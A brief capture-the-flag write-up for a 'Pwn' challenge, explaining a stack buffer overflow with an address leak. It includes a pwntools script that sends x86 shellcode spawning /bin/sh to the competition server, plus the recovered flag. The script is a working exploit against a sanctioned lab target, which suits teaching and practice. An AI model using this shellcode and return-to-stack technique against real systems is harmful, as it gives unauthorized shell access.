# El-Primo
Pwn, 60

>  Written by agcdragon
>  My friend just started playing Brawl Stars and he keeps raging because he can't beat El Primo! Can you help him?
>  nc p1.tjctf.org 8011

This challenge was a buffer overflow with a stack leak and an executable stack, so we just had to write some shellcode and return to it.

```python
from pwn import *

#p = process("./el_primo")
p = remote("p1.tjctf.org", 8011)
#gdb.attach(p)
p.recvuntil(": 0x")
i = int(p.recvuntil("\n")[:-1], 16)
p.sendline(p32(i+4)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+p32(i+4))

p.interactive()
```

Flag: `tjctf{3L_PR1M0O0OOO!1!!}`